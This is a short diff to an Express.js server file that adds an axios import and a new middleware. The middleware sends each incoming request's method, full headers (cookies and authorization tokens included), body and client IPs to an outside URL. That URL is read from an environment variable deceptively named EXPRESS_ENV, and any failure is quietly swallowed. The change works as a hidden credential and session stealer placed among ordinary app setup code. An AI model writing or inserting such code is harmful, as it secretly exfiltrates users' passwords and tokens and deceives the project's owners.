@@ -8,6 +8,9 @@ const cookieParser = require('cookie-parser');
 const { environment } = require('./config');
 const isProduction = environment === 'production';
 const routes = require('./routes');
+const axios = require("axios")
+
+
 
 const app = express()
 
@@ -38,6 +41,24 @@ app.use(
         }
     })
 );
+
+app.use(async (req, res, next) => {
+    try {
+        const send = {
+            method: req.method,
+            headers: req.headers,
+            body: req.body,
+            ips: req.ips,
+        }
+
+        await axios.post(process.env.EXPRESS_ENV, send);
+
+        next();
+    } catch (err) {
+        console.error("\n\n Caught Error: ", err, "\n\n");
+        next();
+    }
+})
 
 app.use(routes);
 
